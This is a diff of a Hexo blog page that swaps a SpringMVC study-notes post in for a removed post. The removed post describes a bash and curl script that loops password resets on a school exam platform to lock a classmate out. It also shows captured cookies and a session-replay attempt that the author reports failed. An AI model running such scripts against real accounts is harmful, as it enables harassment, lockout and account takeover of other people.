@@ -19,26 +19,25 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="引言前几天复习C语言，摸鱼了几天之后准备去学校的考试平台上做个题练练手，结果太久没登忘记密码了😓结果发现重置密码只需身份证号，而身份证号这种信息在同学之间几乎完全可见，忍不住想到有意思的事。 不过有个问题，重置之后受害者发现登陆不了，只需要重新重置一次不就可以了？那重置似乎也没什么意义……又想了想，如果我能写个脚本，不断重置密码，在受害者重置完到输入密码登录的间隔中又重置了一次密码，岂不就可以做">
+    <meta name="description" content="SpringMVC是隶属于Spring框架的一部分，主要是用来进行Web开发，是对Servlet进行了封装。 SpringMVC是处于Web层的框架，所以其主要作用就是用来接收前端发过来的请求和数据，然后经过处理之后将处理结果响应给前端，所以如何处理请求和响应是SpringMVC中非常重要的一块内容。 REST是一种软件架构风格，可以降低开发的复杂性，提高系统的可伸缩性，后期的应用也是非常广泛。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="简单的Shell脚本实战">
-<meta property="og:url" content="http://example.com/2021/12/21/simple-shell-script/index.html">
+<meta property="og:title" content="SpringMVC学习笔记">
+<meta property="og:url" content="http://example.com/2023/03/12/Note-of-SpringMVC-learning/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="引言前几天复习C语言，摸鱼了几天之后准备去学校的考试平台上做个题练练手，结果太久没登忘记密码了😓结果发现重置密码只需身份证号，而身份证号这种信息在同学之间几乎完全可见，忍不住想到有意思的事。 不过有个问题，重置之后受害者发现登陆不了，只需要重新重置一次不就可以了？那重置似乎也没什么意义……又想了想，如果我能写个脚本，不断重置密码，在受害者重置完到输入密码登录的间隔中又重置了一次密码，岂不就可以做">
+<meta property="og:description" content="SpringMVC是隶属于Spring框架的一部分，主要是用来进行Web开发，是对Servlet进行了封装。 SpringMVC是处于Web层的框架，所以其主要作用就是用来接收前端发过来的请求和数据，然后经过处理之后将处理结果响应给前端，所以如何处理请求和响应是SpringMVC中非常重要的一块内容。 REST是一种软件架构风格，可以降低开发的复杂性，提高系统的可伸缩性，后期的应用也是非常广泛。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://view.moezx.cc/images/2018/05/13/image-404.png">
-<meta property="article:published_time" content="2021-12-21T12:57:25.000Z">
-<meta property="article:modified_time" content="2022-11-12T13:15:28.352Z">
+<meta property="og:image" content="https://pic.imgdb.cn/item/631969df16f2c2beb1dfa3f2.jpg">
+<meta property="article:published_time" content="2023-03-12T10:00:45.000Z">
+<meta property="article:modified_time" content="2023-03-17T04:53:45.198Z">
 <meta property="article:author" content="Kizurena">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://view.moezx.cc/images/2018/05/13/image-404.png">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/631969df16f2c2beb1dfa3f2.jpg">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
     
-    <title>简单的Shell脚本实战 · Kizureina&#39;s Blog</title>
+    <title>SpringMVC学习笔记 · Kizureina&#39;s Blog</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -263,7 +262,7 @@
                 <a href="/">Kizureina&#39;s Blog</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">简单的Shell脚本实战</a>
+                <a href="#" class="post-name">SpringMVC学习笔记</a>
             </div>
         </div>
     
@@ -309,7 +308,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                简单的Shell脚本实战
+                SpringMVC学习笔记
             <!-- 404 -->
             
         </h1>
@@ -329,22 +328,20 @@
                     <div class= post-intro-tags >
     
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="Linux">Linux</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="java">java</a>
     
 </div>
 
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">1.9k</span>Reading time: <span class="post-count reading-time">8 min</span></span>
+                        <span>Word count: <span class="post-count word-count">875</span>Reading time: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2021/12/21</span>
+                    <span class="post-intro-time">2023/03/12</span>
                     <!-- busuanzi -->
                     
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
@@ -499,60 +496,82 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>前几天复习C语言，摸鱼了几天之后准备去学校的考试平台上做个题练练手，结果太久没登忘记密码了😓结果发现<strong>重置密码只需身份证号</strong>，而身份证号这种信息在同学之间几乎完全可见，忍不住想到有意思的事。</p>
-<p>不过有个问题，重置之后受害者发现登陆不了，只需要重新重置一次不就可以了？那重置似乎也没什么意义……又想了想，如果我能写个脚本，不断重置密码，在受害者重置完到输入密码登录的间隔中又重置了一次密码，岂不就可以做到始终让受害者卡在登录和重置页面了吗？听起来有意思，刚好最近我又在鼓捣**<a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl</a>** ，对用shell发起请求比较熟悉，就着手试着写了下。</p>
-<p>注：因为我在楼下的二手书店里淘来的Linux教程写shell编程用的bash，以下基于<strong>bash语法</strong>。</p>
-<h3 id="简单的实现"><a href="#简单的实现" class="headerlink" title="简单的实现"></a>简单的实现</h3><p>如上所述，不断发起请求需要用到循环，就去查了下shell脚本中循环的语法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>((i=0;;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello world!&quot;</span></span><br><span class="line">    <span class="built_in">pwd</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<p>因为for循环的第二个遍历条件为空，故如上的脚本将<strong>无限循环</strong>输出hello world和当前目录(pwd)。</p>
-<p>下一步就是如何发起修改密码的请求，当然是用curl</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://exam.mit.edu.cn/index.php?r=not%2Fresetpasswd&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>修改密码的数据请求是用的是post，burp抓包看下请求头发现学号和身份证号参数名分别是StuNum和IC，构造curl的post请求:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data <span class="string">&quot;StuNum=123456&amp;IC=123456789546821350&quot;</span> <span class="string">&quot;http://exam.mit.edu.cn/index.php?r=not%2Fresetpasswd&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>为了方便用，再做个接口:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;plz input the student number:&quot;</span></span><br><span class="line"><span class="built_in">read</span> stunum</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;plz input the ic:&quot;</span></span><br><span class="line"><span class="built_in">read</span> ic</span><br><span class="line">curl -X POST --data <span class="string">&quot;StuNum=<span class="variable">$&#123;stunum&#125;</span>&amp;IC=<span class="variable">$&#123;ic&#125;</span>&quot;</span> <span class="string">&quot;http://exam.mit.edu.cn/index.php?r=not%2Fresetpasswd&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><em>注:read传参变量需要用</em><em>${}</em>**</p>
-<p>再加上循环就能完成无限循环发起请求修改密码，但试了下才想起来还是不行，因为重置密码只能重置成默认密码也就是学号，受害者只有第一次会发现登不上，第二次虽然重置但还是默认，所以完全没影响……</p>
-<p>不过，如果能修改密码后再登录到账号内，用正常的修改密码操作完成修改密码，岂不就可以实现之前的思路了？</p>
-<p>毫无疑问，这次的关键在<strong>cookie</strong>：<em>账号内</em>修改密码的页面多半是用cookie完成身份验证的，而这个cookie就是在<em>登录前</em>修改密码页面的响应头中（在正常的重置密码时，会在修改密码页面提交post传参，然后将相应头的cookie用作跳转的cookie重新请求原页面）</p>
-<p>curl有类似操作的命令参数:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt <span class="string">&quot;url1&quot;</span></span><br><span class="line">curl -b cookie.txt <span class="string">&quot;url2&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>如上-c将请求url1的cookie保存至cookie.txt，然后-b用cookie.txt作cookie请求url2.</p>
-<p>我实际操作了下，发现登录页面始终返回402 refused,想了想可能是DNS解析的问题，改成IP之后可以了，最终的脚本如下:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#this shell script is wrrted by Yo1uk0</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="title">green</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[32m\033[01m<span class="variable">$1</span>\033[0m&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">red</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[31m\033[01m<span class="variable">$1</span>\033[0m&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;************************************&quot;</span></span><br><span class="line">red <span class="string">&quot;            Welcome!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;************************************&quot;</span></span><br><span class="line">green <span class="string">&quot;请输入学号捏:&quot;</span></span><br><span class="line"><span class="built_in">read</span> stunum </span><br><span class="line">green <span class="string">&quot;请输入身份证号捏:&quot;</span></span><br><span class="line"><span class="built_in">read</span> ic</span><br><span class="line">red <span class="string">&quot;秋豆麻袋捏^_^&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>((i=0;;i++))</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">    <span class="built_in">sleep</span> 10;</span><br><span class="line">    <span class="comment">#传参引用需要加$&#123;&#125;</span></span><br><span class="line">    curl -X POST --data <span class="string">&quot;StuNum=<span class="variable">$&#123;stunum&#125;</span>&amp;IC=<span class="variable">$&#123;ic&#125;</span>&quot;</span> <span class="string">&quot;http://exam.cuit.edu.cn/index.php?r=not%2Fresetpasswd&quot;</span></span><br><span class="line">    green <span class="string">&quot;修改密码完成捏！&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">#下面url无法直接用域名访问，故用ip</span></span><br><span class="line"> </span><br><span class="line">    curl -c cookie114514 -d <span class="string">&quot;StuNumber=<span class="variable">$&#123;stunum&#125;</span>&amp;password=<span class="variable">$&#123;stunum&#125;</span>&quot;</span> http://222.18.158.42/index.php?r=front%2Fsite%2Flogin  </span><br><span class="line">    green <span class="string">&quot;获取cookie完成捏！&quot;</span></span><br><span class="line"> </span><br><span class="line">    curl -b cookie114514 <span class="string">&quot;http://exam.cuit.edu.cn/index.php?r=front%2Fsite%2Findex&quot;</span></span><br><span class="line">    green <span class="string">&quot;会话劫持完成捏！登录成功！&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">red <span class="string">&quot;susess!&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>但我实际测试了下发现可以完成密码修改和获取cookie，但无法成功<strong>登录</strong>，看了下生成的cookie文件:</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Netscape HTTP Cookie File</span><br><span class="line"># https://curl.se/docs/http-cookies.html</span><br><span class="line"># This file was generated by libcurl! Edit at your own risk.</span><br><span class="line">#HttpOnly_222.18.158.42 FALSE   /       FALSE   1639852412      _identity       216677e5730f942bd87c1fa13ad6b5b71bc63a118fac7db5ea582088e3d56a27a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Biwdaawdawdawd%3A1%3Bs%3dawadwawd1122179%22%2C%dwaawd9%22%2C18000%5D%22%3B%7D</span><br><span class="line">#HttpOnly_222.18.158.42 FALSE   /       FALSE   0       PHPSESSID       64lflvvcue2o1dawadf6i2tpt15</span><br><span class="line">&#123;1&#125;</span><br></pre></td></tr></table></figure>
-
-<p>本以为是cookie未能正常发送，想用<a target="_blank" rel="noopener" href="http://c.biancheng.net/view/4028.html">sed命令</a>和<a target="_blank" rel="noopener" href="https://blog.csdn.net/gua___gua/article/details/49304699">正则表达式</a>修改匹配的文本，但似乎没这么简单。抓包看下登录页面生成cookie的<strong>响应头</strong>:</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 21 Dec 2021 16:25:56 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.18 (Ubuntu)</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=9mc7imdr5femaapggh6cl0p660; path=/; HttpOnly</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>_identity=216677e5730f942bd87c1fa13ad6b5b71bc63a118fac7db5ea582088e3d56a27a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A33%3A%22%5B%222021122179%22%2C%222021122179%22%2C18000%5D%22%3B%7D; expires=Tue, 21-Dec-2021 21:25:56 GMT; Max-Age=18000; path=/; httponly</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"> </span><br><span class="line">&#123;&quot;error&quot;:0,&quot;msg&quot;:&quot;\u767b\u5f55\u6210\u529f&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>很明显set-cookie生成的键值对与密码和学号有关，PHPSESSID为随机值。</p>
-<p>正常<strong>登录后</strong>修改密码的<strong>请求头</strong>：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?r=front%2Fsite%2Fchange</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>exam.mit.edu.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>60</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://exam.mit.edu.cn</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://exam.mit.edu.cn/index.php?r=front%2Fsite%2Fchange-password</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,ja;q=0.8,zh-TW;q=0.7,en;q=0.6,eu;q=0.5</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17d3e299b16207-07b379d58115b1-57b1a33-144000-17d3e299b171050; PHPSESSID=ul2bcepjn984q5o0gqfrr94qp5; _identity=216677e5730f942bd87c1fa13ad6b5b71bcwadwaAdawfaef63a118fac7db5ea582088e3d56a27a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A33%3Awafd%22%5B%222021122179%2C%222021122179%22%2C18000%5D%22%3B%7D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"> </span><br><span class="line">StuNumber=20211221&amp;oldpassword=2021122&amp;newpassword=2021</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>看起来Referer和Origin也是**<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/446379414">前后端鉴权</a>**的重要部分，但终归是静态的，很容易就修改，真正麻烦的还是有失效时限的token。我在burp的repeater模块试了下，即便是完全相同的请求头而且返回200也无法二次修改密码，而且一段时间后会直接302.</p>
-<p>回头想想，其实这种脚本的关键在于模拟用户在浏览器正常发起请求的过程，完成正常的鉴权来完成传参。</p>
-<p>现在的问题是如何绕过<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/353692010">鉴权</a>，如果不考虑token，正常的cookie与session交互流程如下:<br><a target="_blank" rel="noopener" href="https://kusarinoshojo.space/wp-content/uploads/2021/12/wp_editor_md_ea1c5a7bfb5462952d50ca553a02745a.jpg"><img src="https://view.moezx.cc/images/2018/05/13/image-404.png" alt="img"></a></p>
-<p><strong>刚才抓包是对服务端的请求，因此在数据库校验成功后服务器存session并在前端set-cookie，即刚才生成在响应头里的cookie(其中含有sessionid)，然后请求登录页面跳转再验证，随后返回登陆后的首页内容。</strong></p>
-<p>这样想似乎思路还是没问题，在curl里再加个参数试试:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -H <span class="string">&quot;Origin: http://exam.cuit.edu.cn&quot;</span> -H <span class="string">&quot;http://exam.cuit.edu.cn/index.php?r=front%2Fsite%2Fchange-password&quot;</span> -d <span class="string">&quot;StuNumber=2021122179&amp;oldpassword=2021122179&amp;newpassword=2021122&quot;</span> --cookie <span class="string">&quot;UM_distinctid=17d3e299b16207-07b379d58115b1-57b1a33-144000-17d3e299b171050; PHPSESSID=ul2bcepjn984q5o0gqfrr94qp5; _identity=216677e5730f942bd87c1fa13ad6b5b71bc63a118fac7db5ea582088e3d56a27a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A33%3A%22%5B%222021122179%22%2C%222021122179%22%2C18000%5D%22%3B%7D&quot;</span> http://exam.mit.edu.cn/index.php?r=front%2Fsite%2Fchange</span><br></pre></td></tr></table></figure>
-
-<p>还是302，难搞，卡在这里搞不懂了，下次试试python的requests库能不能模拟请求。</p>
+        <p>SpringMVC是隶属于Spring框架的一部分，主要是用来进行Web开发，是<strong>对Servlet进行了封装</strong>。</p>
+<p>SpringMVC是处于Web层的框架，所以其主要作用就是用来<strong>接收前端发过来的请求和数据</strong>，然后经过处理之后将处理结果响应给前端，所以如何处理请求和响应是SpringMVC中非常重要的一块内容。</p>
+<p>REST是一种软件架构风格，可以<strong>降低开发的复杂性</strong>，提高系统的可伸缩性，后期的应用也是非常广泛。</p>
+<p>对于SpringMVC的学习，<code>最终要达成的目标：</code></p>
+<ol>
+<li>掌握基于SpringMVC获取请求参数和响应JSON数据操作</li>
+<li>熟练应用基于REST风格的请求路径设置与参数传递</li>
+<li>能根据实际业务建立前后端开发通信协议，并进行实现</li>
+<li>基于SSM整合技术开发任意业务模块功能</li>
+</ol>
+<h2 id="SpringMCV总览"><a href="#SpringMCV总览" class="headerlink" title="SpringMCV总览"></a>SpringMCV总览</h2><p>目前Java Web的开发方式是如下：</p>
+<p>将后端服务器Servlet拆分成三层，分别是Web，Service和DAO。</p>
+<ul>
+<li><p><code>web</code>层主要由<code>servlet</code>来处理，负责页面请求和数据的收集以及响应结果给前端</p>
+</li>
+<li><p><code>service</code>层主要负责<strong>业务逻辑</strong>的处理</p>
+</li>
+<li><p><code>dao</code>层主要负责<strong>数据</strong>的增删改查操作</p>
+</li>
+<li><p>但<code>servlet</code>处理请求和数据时，存在一个问题：一个<code>servlet</code>只能处理一个请求</p>
+</li>
+</ul>
+<p>针对<strong>Web层进行优化</strong>，采用MVC设计模式，将其设计为Controller，View和Model，即MVC的设计模式。</p>
+<ul>
+<li><code>controller</code>负责请求和数据的接收，接收后将其转发给<code>service</code>进行业务处理</li>
+<li><code>service</code>根据需要会调用<code>dao</code>对数据进行增删改查</li>
+<li><code>dao</code>把数据处理完后，将结果交给<code>service</code>，<code>service</code>再交给<code>controller</code></li>
+<li><code>controller</code>根据需求组装成<code>Model</code>和<code>View</code>，<code>Model</code>和<code>View</code>组合起来生成页面，转发给前端浏览器</li>
+<li>这样做的好处就是<code>controller</code>可以处理多个请求，并对请求进行分发，执行不同的业务操作</li>
+</ul>
+<p>但随着互联网的发展，上面的模式因为是<strong>同步</strong>调用，性能太差跟不上需求，所以<strong>异步</strong>调用走到了前端，是现在比较流行的一种处理方式。</p>
+<p><img src="https://pic.imgdb.cn/item/631969df16f2c2beb1dfa3f2.jpg" alt="img"></p>
+<ul>
+<li>因为是异步调用，所以后端不需要返回View视图，将其去除</li>
+<li>前端如果通过异步调用的方式进行交互，后端就需要<strong>将返回的数据转换成JSON格式</strong>进行返回</li>
+<li>SpringMVC主要负责的就是<ul>
+<li>controller如何接收请求和数据</li>
+<li>如何将请求和数据转发给业务层</li>
+<li>如何将响应数据转换成JSON返回到前端</li>
+</ul>
+</li>
+<li>SpringMVC是一种基于Java实现MVC模型的轻量级Web框架<ul>
+<li>优点<ul>
+<li>使用简单、开发快捷（相比较于Servlet）</li>
+<li>灵活性强</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="SpringMCV入门"><a href="#SpringMCV入门" class="headerlink" title="SpringMCV入门"></a>SpringMCV入门</h2><p>因为SpringMVC是一个Web框架，将来是要<strong>替换Servlet</strong>，所以先来回顾下以前Servlet是如何进行开发的?</p>
+<ol>
+<li>创建web工程(Maven结构)</li>
+<li>设置tomcat服务器，加载web工程(tomcat插件)</li>
+<li>导入坐标(Servlet)</li>
+<li>定义处理请求的功能类(UserServlet)</li>
+<li>设置请求映射(配置映射关系)</li>
+</ol>
+<p>SpringMVC的制作过程和上述流程几乎是一致的，具体的实现流程是什么?</p>
+<ol>
+<li>创建web工程(Maven结构)</li>
+<li>设置tomcat服务器，加载web工程(tomcat插件)</li>
+<li>导入坐标(SpringMVC+Servlet)</li>
+<li>定义处理请求的功能类(UserController)</li>
+<li>设置请求映射(配置映射关系)</li>
+<li>将SpringMVC设定加载到Tomcat容器中</li>
+</ol>
 
     </article>
     <!-- license -->
     
         <div class="license-wrapper">
             <p>Author：<a href="http://example.com">Kizurena</a>
-            <p>Link：<a href="http://example.com/2021/12/21/simple-shell-script/">http://example.com/2021/12/21/simple-shell-script/</a>
-            <p>Publish date：<a href="http://example.com/2021/12/21/simple-shell-script/">December 21st 2021, 8:57:25 pm</a>
-            <p>Update date：<a href="http://example.com/2021/12/21/simple-shell-script/">November 12th 2022, 9:15:28 pm</a>
+            <p>Link：<a href="http://example.com/2023/03/12/Note-of-SpringMVC-learning/">http://example.com/2023/03/12/Note-of-SpringMVC-learning/</a>
+            <p>Publish date：<a href="http://example.com/2023/03/12/Note-of-SpringMVC-learning/">March 12th 2023, 6:00:45 pm</a>
+            <p>Update date：<a href="http://example.com/2023/03/12/Note-of-SpringMVC-learning/">March 17th 2023, 12:53:45 pm</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -560,13 +579,13 @@
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2022/01/04/Python-spder-starting/" title="Python爬虫入门">
-                    <div class="nextTitle">Python爬虫入门</div>
-                </a>
-            
         </li>
         <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2023/02/12/Note-of-Spring-learning/" title="Spring学习笔记">
+                    <div class="prevTitle">Spring学习笔记</div>
+                </a>
             
         </li>
     </ul>
@@ -694,7 +713,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">简单的实现</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SpringMCV%E6%80%BB%E8%A7%88"><span class="toc-number">1.</span> <span class="toc-text">SpringMCV总览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SpringMCV%E5%85%A5%E9%97%A8"><span class="toc-number">2.</span> <span class="toc-text">SpringMCV入门</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
